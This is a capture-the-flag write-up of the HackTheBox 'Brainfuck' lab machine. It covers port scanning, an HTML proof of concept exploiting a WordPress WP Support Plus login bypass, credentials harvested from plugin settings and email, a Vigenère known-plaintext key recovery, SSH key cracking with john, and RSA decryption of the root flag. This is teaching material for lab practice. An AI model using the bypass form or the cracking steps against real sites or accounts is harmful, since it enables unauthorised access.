---
title: Brainfuck
description: Brainfuck box from HackTheBox write up.
---

# Brainfuck <a href='/assets/resources/HackTheBox/Brainfuck-resources.zip' title="Download resources"> :material-folder-zip:{:alt="Download resources"} </a>

## Nmap scan

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/Brainfuck]
└─$ sudo nmap -p- --min-rate 1000 <MACHINE_IP>
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-12 08:24 EDT
Nmap scan report for <MACHINE_IP>
Host is up (0.051s latency).
Not shown: 65530 filtered ports
PORT    STATE SERVICE
22/tcp  open  ssh
25/tcp  open  smtp
110/tcp open  pop3
143/tcp open  imap
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 102.62 seconds
```

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/Brainfuck]
└─$ sudo nmap -sC -sV -p22,25,110,143,443 <MACHINE_IP>
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-12 08:27 EDT
Nmap scan report for <MACHINE_IP>
Host is up (0.053s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)
|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)
|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) USER RESP-CODES AUTH-RESP-CODE TOP UIDL PIPELINING CAPA
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: ID listed have IDLE ENABLE Pre-login more post-login AUTH=PLAINA0001 LOGIN-REFERRALS OK IMAP4rev1 capabilities SASL-IR LITERAL+
443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Not valid before: 2017-04-13T11:19:29
|_Not valid after:  2027-04-11T11:19:29
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.79 seconds
```

So some interesting things here. First, the SMTP, POP and IMAP services and then I can see some domains for the 443 port web server: `brainfuck.htb`, `www.brainfuck.htb` and `sup3rs3cr3t.brainfuck.htb`. Let's start with the port 443.

## Port 443

Before starting the enumeration process, I added the domains that Nmap found earlier to my `hosts` file. Accessing to `https://<MACHINE_IP>/` just shows the Nginx default page so we can directly go for the domains found.

### brainfuck.htb and www.brainfuck.htb

Since the `www.brainfuck.htb` domain will redirect to `brainfuck.htb` we can consider them the same thing.

The page is a Wordpress site where only one post was created. In the post, we can get some information. First we know that there is a Wordpress user called `admin` and second there is an email: `orestis@brainfuck.htb` that could be useful later.

The Wordpress version is the 4.7.3, what is really old. Maybe we have something to do here:

```bash
┌──(kali㉿kali)-[~]
└─$ searchsploit Wordpress Core 4.7.3
------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                             |  Path
------------------------------------------------------------------------------------------- ---------------------------------
WordPress Core < 4.7.4 - Unauthorized Password Reset                                       | linux/webapps/41963.txt
WordPress Core < 4.9.6 - (Authenticated) Arbitrary File Deletion                           | php/webapps/44949.txt
WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts                    | multiple/webapps/47690.md
WordPress Core < 5.3.x - 'xmlrpc.php' Denial of Service                                    | php/dos/47800.py
------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

The unauthorized password reset one needs the Wordpress to be accessed using the host IP address and this is not the case, so nothing to do here.

According to `wpscan` WordPress Plugin WP Support Plus with 7.1.3 is installed. It is outdated so let's check for vulnerabilities:

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/Brainfuck]
└─$ searchsploit WordPress Plugin WP Support Plus 7.1.3     
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escala | php/webapps/41006.txt
WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - SQL Injection    | php/webapps/40939.txt
----------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

The first one sounds nice, I built the PoC for our target:

```html
<html>
	<form method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php">
		Username: <input type="text" name="username" value="admin">
		<input type="hidden" name="email" value="orestis@brainfuck.htb">
		<input type="hidden" name="action" value="loginGuestFacebook">
		<input type="submit" value="Login">
	</form>
</html>
```

Opening it in a browser and hitting the login button will bypass the Wordpress login and get access to the dasboard. The problem is that the templates files are not writtable so we can't get RCE with this.

After looking around I found that Easy WP SMTP plugin is installed. Checking the plugin settings and changing the password field from the type `password` to `text` will reveal all we need to login to the SMTP service: `orestis@brainfuck.htb:kHGuERB29DNiNE`.


### sup3rs3cr3t.brainfuck.htb

This page looks like a forum. It allow new users to register so we can login to it. The forum only allows `brainfuck.htb` emails to register and looks like email confirmation is required to participate in the forum what is not good for us.

## Port 143

Let's try to login to the IMAP service with the credentials we found:

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/Brainfuck]
└─$ nc -vn <MACHINE_IP> 143
(UNKNOWN) [<MACHINE_IP>] 143 (imap2) open
* OK [CAPABILITY IMAP4rev1 LITERAL+ SASL-IR LOGIN-REFERRALS ID ENABLE IDLE AUTH=PLAIN] Dovecot ready.
A1 LOGIN orestis kHGuERB29DNiNE
A1 OK [CAPABILITY IMAP4rev1 LITERAL+ SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SPECIAL-USE] Logged in

```

Cool, we are in. Let's check the emails! (I will go with the manual way):
- Once logged in, using `n namespace` we can check the namespaces we have.
```bash
n namespace
* NAMESPACE (("" "/")) NIL NIL
n OK Namespace completed.
```
- Now we have to list the folders we have inside the namespace, in our case we need: `A1 list "" "*"`.
```bash
A1 list "" "*"
* LIST (\HasNoChildren) "/" INBOX
A1 OK List completed (0.000 + 0.000 secs).
```
- Cool, in this case only the `INBOX` folder is available so: `g21 SELECT "INBOX"`.
```bash
g21 SELECT "INBOX"
* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
* 3 EXISTS
* 0 RECENT
* OK [UNSEEN 3] First unseen.
* OK [UIDVALIDITY 1493461609] UIDs valid
* OK [UIDNEXT 6] Predicted next UID
* OK [HIGHESTMODSEQ 6] Highest
g21 OK [READ-WRITE] Select completed (0.000 + 0.000 secs).
```
- Let's see what emails ids we have with `s search ALL`.
```bash
s search ALL
* SEARCH 1 2
s OK Search completed (0.001 + 0.000 secs).
```

- Now to see the emails use: `F1 fetch <email_id> RFC822` and the email will be displayed.

The email with the id number 2 is interesting:

```
Hi there, your credentials for our "secret" forum are below :)

username: orestis
password: kIEnnfEKJ#9UmdO

Regards
```

So now we can login to `sup3rs3cr3t.brainfuck.htb` with `orestis:kIEnnfEKJ#9UmdO`.

## As orestis in the forum

Now that we can access to this forum, we see some kind of private threads that were hidden. Looks like Orestis is asking the page admin for a SSH key and the admin gave it to him using an encrypted threah.

Time to analize the encrypted messages, this is one of them:

```
Mya qutf de buj otv rms dy srd vkdof :)

Pieagnm - Jkoijeg nbw zwx mle grwsnn
```

Looks like our friend Orestis is signing the messages with: `Orestis - Hacking for fun and profit` according other messages sent by him. The cipher text could be Vigenère, a variation of Caesar, beacause the encrypted sign changes from one message to another.

This kind of cipher is vulnerable to a known plaintext attack. Vigenère cipher calculate the n-th ciphertext letter by adding the n-th plaintext letter and the n-th key letter in mod 26 (Remember that the used key will be repeated as many times as necessary to be as long as the text). The final operation is: `Cn = Pn + Kn mod 26` so if we want to get the key we could do `Kn = Cn - Pn mod 26`.

Time for Python!

```python
#! /usr/bin/env python3
import string

kwnon_plaintext = 'Hackingforfunandprofit'
cryptogram = 'Jkoijegnbwzwxmlegrwsnn'
key = []

for cryptogram_letter, kwnon_plaintext_letter in zip(cryptogram.lower(), kwnon_plaintext.lower()):
	# Kn = Cn - Pn mod 26
	key_letter_num = (string.ascii_lowercase.find(cryptogram_letter) - string.ascii_lowercase.find(kwnon_plaintext_letter)) % 26
	key.append(string.ascii_lowercase[key_letter_num])

key = ''.join(key)
print(f'Key --> {key}')
```

Executing this code will result in: `Key --> ckmybrainfuckmybrainfu`. Since we know the key is repeated to be as long as the text, the key is: `fuckmybrain`. With that, we can use Cyberchef or something like that to get the messages in plaintext. Here it is the interesting one:

```
There you go you stupid fuck, I hope you remember your key password because I dont :)

https://<MACHINE_IP>/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa
```

Going to that URL will download a private SSH key for us. Orestis say it will brute force his key so I guess we would need to do the same.

## Brute forcing the key

The first thing we need is to transform the private key to something john the ripper can read:
```bash
/usr/share/john/ssh2john.py id_rsa > hash
```

Now that we have a file with the hash to crack we can just:
```bash
┌──(kali㉿kali)-[~/Desktop/HTB/Brainfuck]
└─$ john --wordlist=~/Wordlists/rockyou.txt hash                                                               130 ⨯
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
3poulakia!       (id_rsa)
Warning: Only 2 candidates left, minimum 8 needed for performance.
1g 0:00:00:02 DONE (2021-10-12 15:31) 0.4524g/s 6489Kp/s 6489Kc/s 6489KC/sa6_123..*7¡Vamos!
Session completed
```

And the password is `3poulakia!`, we can now login through SSH.

## In the machine as orestis

We can get the user flag now under `/home/orestis/user.txt`. After that we see something interesting, a file called `encrypt.sage` that encrypts the root flag using RSA, the thing is that the program print all the generated values we need for decription to a file called `debug.txt`.

### Getting the root flag

In order to get the root flag we need to use the data in the `debug.txt` file to decrypt the root flag located in the `output.txt`. 

Checking how RSA works, the first thing we have to know is that the public key is formmed by two numbers: `(e, n)` and the private key is formmed by another two numbers `(d, n)`. The letters used to represent the numbers are the same as the used in the code (And also in the RSA specification). The code is using the public key to encrypt the flag and prints to the `debug.txt` file the variables `p`, `q` and `e`.

We already have the private key `n` value because `p*q = n` so we have to get `d`. This variable can be calculated from this formula: `d*e mod phi = 1` (Modular inverse) where the value `phi` is `(p-1)*(q-1)`.

Once we get the right `d` we can calculate `cryptogram^d mod N` to decrypt the flag. I wrote this Python code for all this calculations:

```python
#! /usr/bin/env python3

p = 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
q = 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
e = 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
n = p*q
phi = (p-1)*(q-1)
d = pow(e, -1, phi) # Modular inverse

if(d):
	encrypted_root_flag = 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182
	flag = pow(encrypted_root_flag, d ,n)
	flag = bytes.fromhex(hex(flag)[2::]).decode()

	print(f'Root flag --> {flag}')
else:
	print('Error decrypting the flag')
```

Executing the code above will expose the root flag!
